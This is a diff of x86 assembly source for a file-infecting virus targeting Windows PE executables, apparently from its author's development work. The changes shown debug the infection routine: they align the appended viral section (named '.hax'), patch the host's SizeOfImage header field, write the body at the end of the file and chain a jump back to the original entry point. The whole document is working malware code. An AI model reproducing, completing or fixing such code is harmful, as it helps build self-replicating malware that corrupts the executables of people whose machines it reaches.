@@ -248,6 +248,7 @@ infect_file:
     sub     ecx,offset deltaoffset
     
     sub     ecx,edx ; jambi_end - start
+    push    ecx     ; save size
     push    edx     ; save start addr
     ; edx -> start addr / ecx -> size
     ; Write the v1ruuu5 n0wWw!!!
@@ -260,16 +261,19 @@ infect_file:
     push    [ebp+12] ; PE header
     push    [ebp+8]  ; DOS header
     call    ent_get_function_addr
-    pop     edx ; restore start addr
-    
+    pop     edx ; restore size
+    pop     ecx ; restore start addr
+    mov     edi,eax ; WriteFile
+
+    push    ecx ; size
     ; Write the new section header
     push    0
     push    0
     push    ecx ; size
     push    edx ; addr
     push    esi ; fd
-    call    eax
-    
+    call    edi
+    pop     ecx ; size
     ; Build the "jmp Original Entry Point" code
     sub     esp,8       ; some space
     mov     ebx,esp     ; save esp 
@@ -280,16 +284,32 @@ infect_file:
     add     ebx,4
     mov     ax,0E2FFh   ; jmp edx
     mov     [ebx],ax
-    
+
+    mov     ebx,1000h
+    sub     ebx,7
+    sub     ebx,ecx
     ; Write the jmp at the end
     push    0
     push    0
     push    7   ; size
     push    esp ; addr
     push    esi ; fd
-    call    eax
+    call    edi
     add     esp,8 ; restore stack
-    
+
+    sub     esp,ebx ; room
+    push    ebx
+   ; Write the jmp at the end
+    push    0
+    push    0
+    push    ebx ; size
+    push    esp ; addr
+    push    esi ; fd
+    call    edi
+    pop     ebx
+    add     esp,ebx ; restore stack
+
+
     ; Done
     mov     eax,[ebp+16]
     add     eax,offset CloseHandle_b
@@ -510,11 +530,95 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
+;;;;;; lol
+    ; Move to Size of Image
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    24h
+    push    [ebp+20]
+    call    ebx
+
+    ; Read Size of Image
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    4
+    push    esi
+    push    [ebp+20]
+    call    ebx
+
+    ; get number of section
+    mov ecx,[esi]
+    add ecx,1000h
+    mov [esi],ecx
+
+    ; Move to the Number of section field
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    -4
+    push    [ebp+20]
+    call    ebx
+
+    mov     [esi+16],eax ; save the file offset to the number of section
+
+    ; Write the updated number of section
+    mov     ebx,[ebp-20]
+    push    0
+    push    0
+    push    4
+    push    esi
+    push    [ebp+20]
+    call    ebx
+;;;;;;;;; lol
+    ; Move to Size of Image
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    -38h
+    push    [ebp+20]
+    call    ebx
+
+    ; Read Size of Image
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    4
+    push    esi
+    push    [ebp+20]
+    call    ebx
+
+    ; get number of section
+    mov ecx,[esi]
+    add ecx,1000h
+    mov [esi],ecx
+
+    ; Move to the Number of section field
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    -4
+    push    [ebp+20]
+    call    ebx
+
+    mov     [esi+16],eax ; save the file offset to the number of section
+
+    ; Write the updated number of section
+    mov     ebx,[ebp-20]
+    push    0
+    push    0
+    push    4
+    push    esi
+    push    [ebp+20]
+    call    ebx
+;;;; lololl!11201
+
     ; Move to future new section
     mov     ebx,[ebp-24]
-    push    FILE_BEGIN
+    push    FILE_END
     push    0
-    push    [esi+12]
+    push    0
     push    [ebp+20]
     call    ebx
 
@@ -668,7 +772,7 @@ image_section_done:
     add     ecx,offset jambi_end
     sub     ecx,offset deltaoffset
     sub     ecx,edx ; jambi_end - start
-    push    ecx ; virusSize (not aligned)
+    push    1000h ; virusSize (aligned)
 
     mov     edx,[ebp+8] ; caller's stack
     mov     ebx,[edx] ; Virtual size
@@ -684,7 +788,7 @@ image_section_done:
     add     ecx,offset jambi_end
     sub     ecx,offset deltaoffset
     sub     ecx,edx ; jambi_end - start
-    push    ecx ; virusSize (not aligned)
+    push    1000h ; virusSize (aligned)
     
     push    0 ; Null padd for name
     push    7861682eh ; name: .hax
@@ -989,8 +1093,7 @@ strcmp_done:
 
 exit_success:
     ; WIN
-    mov     edx,042h
-    call    edx
+    jmp jambi_end ; more jumps there :D
 
 exit_fail:
     ; For debug :D
